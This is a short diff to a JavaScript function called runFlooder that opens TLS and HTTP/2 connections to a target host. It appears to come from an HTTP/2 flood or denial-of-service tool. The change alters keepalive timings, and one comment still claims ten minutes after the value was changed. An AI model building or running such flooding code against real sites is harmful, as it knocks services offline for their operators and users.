@@ -3326,7 +3326,7 @@ function runFlooder() {
       return; // Skip if connection failed
     }
 
-    connection.setKeepAlive(true, 600000); // 10 minutes keepalive
+    connection.setKeepAlive(true, 100000); // 10 minutes keepalive
 
     // TLS connection configuration
     const tlsOptions = {
@@ -3374,7 +3374,7 @@ function runFlooder() {
     // Create TLS connection
     const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
-    tlsConn.setKeepAlive(true, 60 * 10000 + Math.random() * 20000);
+    tlsConn.setKeepAlive(true, 10000); 
 
     // Create HTTP/2 connection
     const http2Connection = http2.connect(parsedTarget.href, {
